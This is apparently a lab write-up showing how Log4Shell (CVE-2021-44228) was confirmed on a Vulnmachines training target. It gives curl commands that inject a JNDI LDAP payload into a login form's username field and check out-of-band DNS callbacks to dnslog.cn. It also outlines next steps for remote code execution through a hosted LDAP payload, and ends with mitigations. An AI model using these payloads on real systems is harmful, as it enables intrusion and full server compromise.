# Vulnmachines Advance Lab: Log4J is Everywhere

- Target: `http://log4jshell.vulnmachines.com:8099/`
- Stack: `Apache-Coyote/1.1` (Tomcat 8.0.36)
- Entry point: Login form `POST /login`
- Finding: Log4Shell (CVE-2021-44228) confirmed via out-of-band DNS callback when injecting `${jndi:ldap://...}`

## PoC summary

- OAST provider: `dnslog.cn`
- Unique domain obtained: `9ohmto.dnslog.cn`
- Vulnerable sink: `uname` parameter in `POST /login`

## Steps to reproduce

1) Obtain a DNS callback domain

```bash
# Get a unique DNS domain from dnslog.cn (browser or CLI)
curl -s -c /tmp/dnslog.cookies http://dnslog.cn/ >/dev/null
curl -s -b /tmp/dnslog.cookies -c /tmp/dnslog.cookies http://dnslog.cn/getdomain.php
# -> returns something like 9ohmto.dnslog.cn
```

2) Send payloads to the target

```bash
# Baseline headers
curl -sI http://log4jshell.vulnmachines.com:8099/

# PoC 1: inject JNDI payload into uname at POST /login (confirmed)
curl -i -X POST \
  http://log4jshell.vulnmachines.com:8099/login \
  -d 'uname=${jndi:ldap://uname.9ohmto.dnslog.cn/a}' \
  -d 'password=test'
# Response (snippet):
# HTTP/1.1 200 OK
# <code> the password you entered was invalid, <u> we will log your information </u> </code>
```

3) Verify DNS callbacks

```bash
curl -s -b /tmp/dnslog.cookies -c /tmp/dnslog.cookies http://dnslog.cn/getrecords.php
# Observed evidence (example):
# [["uname.9ohmto.dnslog.cn","65.1.174.191","2025-08-15 06:02:26"],
#  ["uname.9ohmto.dnslog.cn","13.235.197.121","2025-08-15 06:02:26"],
#  ["9ohmto.dnslog.cn","65.1.174.191","2025-08-15 06:01:46"],
#  ["9ohmto.dnslog.cn","13.235.197.122","2025-08-15 06:01:29"]]
```

Notes:
- Multiple vectors (User-Agent, X-Forwarded-For, Referer, Forwarded) were tested on `/` and `/login` but only `uname` reliably triggered callbacks in this instance.
- The HTML indicates logging on failed auth: "we will log your information", consistent with the vulnerable sink.

## Risk
- If remote class loading is permitted (unpatched JVM/log4j), this can escalate to RCE via LDAP/RMI reference, leading to full server compromise.

## Next steps (for full exploit/RCE)
- Host a reachable LDAP/HTTP server (public VPS or tunnel like ngrok/cloudflared) and serve a Java class payload.
- Use a payload such as `${jndi:ldap://<public-ip-or-domain>:1389/Exploit}` to trigger code execution (e.g., read `flag` file or run `whoami`).
- Validate impact and collect flags if present.

## Mitigations
- Upgrade Log4j to >= 2.17.x (or the lab’s patched version).
- Set `log4j2.formatMsgNoLookups=true`, remove JNDI lookups, or apply vendor backports.
- Sanitize/avoid logging untrusted input or restrict JNDI protocols.